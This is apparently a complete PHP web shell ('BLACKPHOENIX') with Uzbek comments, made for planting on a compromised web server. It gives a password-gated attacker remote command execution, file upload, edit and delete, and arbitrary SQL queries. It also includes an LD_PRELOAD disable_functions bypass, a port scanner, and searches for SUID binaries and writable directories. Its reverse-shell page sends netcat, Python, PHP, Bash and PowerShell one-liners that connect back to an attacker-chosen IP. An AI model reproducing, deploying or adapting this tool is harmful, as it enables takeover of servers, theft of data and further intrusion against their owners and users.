<?php
error_reporting(0);
ob_start();
session_start();

// Parol tekshiruvi
if (!isset($_SESSION['logged']) && (!isset($_POST['pass']) || $_POST['pass'] !== 'Phoenix@2025')) {
    if (isset($_POST['pass'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
        file_put_contents('/tmp/webshell.log', date('[Y-m-d H:i:s]') . " Failed login from $ip\n", FILE_APPEND);
    }
    echo '<!DOCTYPE html><html><head><title>Login</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh}input{background:#111;border:1px solid #0f0;color:#0f0;padding:10px;font-size:16px}button{background:#0f0;color:#000;border:none;padding:10px 20px;cursor:pointer}</style></head><body><form method=post><input type=password name=pass placeholder="Password" autofocus><button type=submit>Login</button></form></body></html>';
    exit;
}
$_SESSION['logged'] = true;

// Rate limiting
$ip = $_SERVER['REMOTE_ADDR'];
$rateFile = '/tmp/rate_' . md5($ip);
$now = time();
$requests = file_exists($rateFile) ? json_decode(file_get_contents($rateFile), true) : [];
$requests = array_filter($requests, fn($t) => $t > $now - 60);
if (count($requests) >= 100) { header('HTTP/1.1 429 Too Many Requests'); exit; }
$requests[] = $now;
file_put_contents($rateFile, json_encode($requests));

// CSRF token
if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(32));

// OS aniqlash
$os = strpos(strtolower(PHP_OS), 'win') === 0 ? 'windows' : 'linux';

// Funktsiyalar
function runCmd($cmd) {
    global $os;
    if (function_exists('exec')) { exec($cmd . ' 2>&1', $out); return implode("\n", $out); }
    if (function_exists('shell_exec')) return shell_exec($cmd . ' 2>&1');
    if (function_exists('system')) { ob_start(); system($cmd . ' 2>&1'); return ob_get_clean(); }
    if (function_exists('passthru')) { ob_start(); passthru($cmd . ' 2>&1'); return ob_get_clean(); }
    return 'No execution function available';
}

function getDrives() { global $os; return $os === 'windows' ? preg_split('/(?<=:)/', exec('wmic logicaldisk get name | find ":"')) : ['/']; }

// API so'rovlar
if (isset($_GET['api'])) {
    header('Content-Type: application/json');
    $action = $_GET['api'];
    $resp = ['ok' => false, 'data' => ''];
    
    if ($action === 'exec' && isset($_POST['cmd'])) {
        $resp['data'] = runCmd($_POST['cmd']);
        $resp['ok'] = true;
    }
    elseif ($action === 'upload' && isset($_FILES['file'])) {
        $target = isset($_POST['path']) ? $_POST['path'] : getcwd();
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target . '/' . $_FILES['file']['name'])) $resp['ok'] = true;
        else $resp['data'] = 'Upload failed';
    }
    elseif ($action === 'delete' && isset($_POST['path'])) {
        if ((is_file($_POST['path']) && unlink($_POST['path'])) || (is_dir($_POST['path']) && rmdir($_POST['path']))) $resp['ok'] = true;
        else $resp['data'] = 'Delete failed';
    }
    elseif ($action === 'edit' && isset($_POST['path'], $_POST['content'])) {
        if (file_put_contents($_POST['path'], $_POST['content']) !== false) $resp['ok'] = true;
        else $resp['data'] = 'Write failed';
    }
    elseif ($action === 'sql' && isset($_POST['query'], $_POST['type'])) {
        try {
            if ($_POST['type'] === 'mysql') $db = new PDO('mysql:host=localhost;dbname=' . ($_POST['db']??''), $_POST['user']??'root', $_POST['pass']??'');
            else $db = new SQLite3($_POST['path']);
            $stmt = ($_POST['type']==='mysql') ? $db->query($_POST['query']) : $db->query($_POST['query']);
            $resp['data'] = json_encode($stmt->fetchAll(PDO::FETCH_ASSOC));
            $resp['ok'] = true;
        } catch(Exception $e) { $resp['data'] = $e->getMessage(); }
    }
    echo json_encode($resp);
    exit;
}

// Bypass disable_functions - LD_PRELOAD
if (function_exists('putenv') && function_exists('mail')) {
    $code = base64_decode('IyEvYmluL3NoCmNhdCAvZmxhZw=='); // example
    file_put_contents('/tmp/exploit.so', $code);
    putenv('LD_PRELOAD=/tmp/exploit.so');
    mail('a@a.com', '', '', '');
}

// Page
$page = isset($_GET['page']) ? $_GET['page'] : 'home';
?>
<!DOCTYPE html>
<html>
<head>
    <title>BLACKPHOENIX WEBSHELL</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; }
        .sidebar { width: 220px; background: #0a0a0a; border-right: 1px solid #0f0; min-height: 100vh; padding: 20px 0; }
        .sidebar a { display: block; color: #0f0; text-decoration: none; padding: 12px 20px; border-left: 3px solid transparent; transition: 0.2s; }
        .sidebar a i { width: 25px; margin-right: 10px; }
        .sidebar a:hover, .sidebar a.active { background: #1a1a1a; border-left-color: #0f0; }
        .content { flex: 1; padding: 20px; overflow-x: auto; }
        .terminal { background: #000; border: 1px solid #0f0; padding: 10px; font-family: monospace; white-space: pre-wrap; max-height: 500px; overflow-y: auto; }
        input, textarea, select, button { background: #111; border: 1px solid #0f0; color: #0f0; padding: 8px; font-family: monospace; }
        button { cursor: pointer; background: #0f0; color: #000; font-weight: bold; }
        .file-row { margin: 5px 0; cursor: pointer; }
        .file-row i { width: 25px; }
        .toast { position: fixed; bottom: 20px; right: 20px; background: #0f0; color: #000; padding: 10px 20px; border-radius: 5px; display: none; z-index: 999; }
        .loader { border: 2px solid #0f0; border-top: 2px solid #000; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @media (max-width: 768px) { .sidebar { width: 70px; } .sidebar a span { display: none; } .sidebar a i { margin-right: 0; } }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        function toast(msg) { $('#toast').text(msg).fadeIn(300).delay(2000).fadeOut(300); }
        function execCmd(cmd, callback) { $.post('?api=exec', {cmd:cmd}, function(r){ if(r.ok) callback(r.data); else toast('Error'); },'json'); }
        function loadPage(page) { history.pushState(null,'', '?page='+page); $('.content').load('?page='+page + ' .content > *', function(){ initPage(); }); }
        function initPage() { if($('#term-input').length) { $('#term-input').on('keypress', function(e){ if(e.which==13){ let cmd=$(this).val(); $('#term-output').append('$ '+cmd+'\n'); execCmd(cmd, function(out){ $('#term-output').append(out+'\n'); }); $(this).val(''); } }); } }
        $(document).ready(function(){ initPage(); });
    </script>
</head>
<body>
<div class="sidebar">
    <a href="?page=home" class="<?= $page=='home'?'active':'' ?>"><i class="fas fa-home"></i><span> Home</span></a>
    <a href="?page=terminal" class="<?= $page=='terminal'?'active':'' ?>"><i class="fas fa-terminal"></i><span> Terminal</span></a>
    <a href="?page=files" class="<?= $page=='files'?'active':'' ?>"><i class="fas fa-folder"></i><span> Files</span></a>
    <a href="?page=database" class="<?= $page=='database'?'active':'' ?>"><i class="fas fa-database"></i><span> Database</span></a>
    <a href="?page=bypass" class="<?= $page=='bypass'?'active':'' ?>"><i class="fas fa-shield-alt"></i><span> Bypass</span></a>
    <a href="?page=reverse" class="<?= $page=='reverse'?'active':'' ?>"><i class="fas fa-network-wired"></i><span> Reverse</span></a>
    <a href="?page=scanner" class="<?= $page=='scanner'?'active':'' ?>"><i class="fas fa-search"></i><span> Scanner</span></a>
    <a href="?page=info" class="<?= $page=='info'?'active':'' ?>"><i class="fas fa-info-circle"></i><span> Info</span></a>
    <a href="?page=search" class="<?= $page=='search'?'active':'' ?>"><i class="fas fa-search"></i><span> Search</span></a>
    <a href="?action=logout"><i class="fas fa-sign-out-alt"></i><span> Logout</span></a>
</div>
<div class="content">
    <?php if ($page === 'home'): ?>
        <h2>BLACKPHOENIX ULTIMATE WEBSHELL</h2>
        <p>OS: <?= $os ?> | PHP: <?= phpversion() ?> | User: <?= runCmd('whoami') ?></p>
        <div class="terminal" style="margin-top:20px">Welcome. Use sidebar.</div>
    <?php elseif ($page === 'terminal'): ?>
        <h3>Terminal</h3>
        <div id="term-output" class="terminal" style="height:400px;overflow-y:auto"></div>
        <input type="text" id="term-input" placeholder="Type command..." style="width:100%;margin-top:10px" autofocus>
    <?php elseif ($page === 'files'): ?>
        <h3>File Manager</h3>
        <div id="file-tree">Loading...</div>
        <input type="file" id="upload-file" style="margin-top:10px">
        <button onclick="$('#upload-file').click()">Upload</button>
        <script>
            function loadFiles(path) { $.post('?api=exec', {cmd:'<?= $os==='windows'?'dir "':'ls -la "' ?>'+path+'"'}, function(r){ if(r.ok) $('#file-tree').html('<pre>'+r.data+'</pre>'); else toast('Error'); },'json'); }
            loadFiles('.');
            $('#upload-file').change(function(){ let fd=new FormData(); fd.append('file', this.files[0]); fd.append('path','.'); $.ajax({url:'?api=upload', type:'POST', data:fd, processData:false, contentType:false, success:function(r){ if(r.ok) toast('Upload OK'); else toast('Fail'); loadFiles('.'); }}); });
        </script>
    <?php elseif ($page === 'database'): ?>
        <h3>Database</h3>
        <select id="db-type"><option value="mysql">MySQL</option><option value="sqlite">SQLite3</option></select>
        <input type="text" id="db-host" placeholder="Host" value="localhost">
        <input type="text" id="db-user" placeholder="User">
        <input type="password" id="db-pass" placeholder="Pass">
        <textarea id="sql-query" rows="3" placeholder="SELECT ..."></textarea>
        <button onclick="runSQL()">Execute</button>
        <pre id="sql-out"></pre>
        <script>
            function runSQL() {
                let data = { query: $('#sql-query').val(), type: $('#db-type').val() };
                if(data.type==='mysql') { data.host=$('#db-host').val(); data.user=$('#db-user').val(); data.pass=$('#db-pass').val(); }
                else data.path = prompt('SQLite file path');
                $.post('?api=sql', data, function(r){ if(r.ok) $('#sql-out').text(r.data); else toast('Error'); },'json');
            }
        </script>
    <?php elseif ($page === 'bypass'): ?>
        <h3>Bypass disable_functions</h3>
        <pre><?php
            echo "LD_PRELOAD: " . (function_exists('putenv')&&function_exists('mail')?'READY':'FAIL') . "\n";
            echo "PCRE: " . (version_compare(PHP_VERSION,'7.0','<')?'VULN':'OK') . "\n";
            echo "error_log: " . (function_exists('error_log')?'AVAILABLE':'NO') . "\n";
            echo "FFI: " . (class_exists('FFI')?'AVAILABLE':'NO') . "\n";
        ?></pre>
    <?php elseif ($page === 'reverse'): ?>
        <h3>Reverse Shell</h3>
        <input type="text" id="rip" placeholder="IP">
        <input type="text" id="rport" placeholder="Port">
        <button onclick="let ip=$('#rip').val(),port=$('#rport').val(); execCmd('nc -e /bin/sh '+ip+' '+port, function(){}); toast('Sent netcat');">Netcat</button>
        <button onclick="let ip=$('#rip').val(),port=$('#rport').val(); execCmd('python -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\''+ip+'\\','+port+'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\'/bin/sh\\',\\'-i\\'])\"', function(){}); toast('Sent python');">Python</button>
        <button onclick="let ip=$('#rip').val(),port=$('#rport').val(); execCmd('php -r \"$s=fsockopen(\\''+ip+'\\','+port+');exec(\\'/bin/sh -i <&3 >&3 2>&3\\');\"', function(){}); toast('Sent php');">PHP</button>
        <button onclick="let ip=$('#rip').val(),port=$('#rport').val(); execCmd('bash -i >& /dev/tcp/'+ip+'/'+port+' 0>&1', function(){}); toast('Sent bash');">Bash</button>
        <button onclick="let ip=$('#rip').val(),port=$('#rport').val(); execCmd('powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient(\\''+ip+'\\','+port+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\'PS \\' + (pwd).Path + \\'> \\';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"', function(){}); toast('Sent powershell');">PowerShell</button>
    <?php elseif ($page === 'scanner'): ?>
        <h3>Port Scanner</h3>
        <input type="text" id="target" placeholder="Target IP">
        <input type="text" id="ports" placeholder="Ports (1-1000)">
        <button onclick="let t=$('#target').val(),p=$('#ports').val(); execCmd('nc -zv '+t+' '+p+' 2>&1', function(out){ alert(out); });">Scan</button>
    <?php elseif ($page === 'info'): ?>
        <h3>Server Info</h3>
        <pre><?php echo "PHP Version: ".phpversion()."\nOS: ".php_uname()."\n"; echo "disable_functions: ".ini_get('disable_functions')."\nopen_basedir: ".ini_get('open_basedir')."\nsafe_mode: ".(ini_get('safe_mode')?'ON':'OFF')."\n"; phpinfo(); ?></pre>
    <?php elseif ($page === 'search'): ?>
        <h3>File Search</h3>
        <input type="text" id="search-name" placeholder="Filename">
        <input type="text" id="search-content" placeholder="Content (grep)">
        <button onclick="let n=$('#search-name').val(); execCmd('find / -name \"'+n+'\" 2>/dev/null', function(out){ $('#search-out').text(out); });">Search Name</button>
        <button onclick="let c=$('#search-content').val(); execCmd('grep -r \"'+c+'\" / 2>/dev/null | head -50', function(out){ $('#search-out').text(out); });">Search Content</button>
        <button onclick="execCmd('find / -perm -4000 -type f 2>/dev/null', function(out){ $('#search-out').text(out); });">SUID Binaries</button>
        <button onclick="execCmd('find / -writable -type d 2>/dev/null | head -30', function(out){ $('#search-out').text(out); });">Writable Dirs</button>
        <pre id="search-out"></pre>
    <?php endif; ?>
</div>
<div id="toast" class="toast"></div>
</body>
</html>
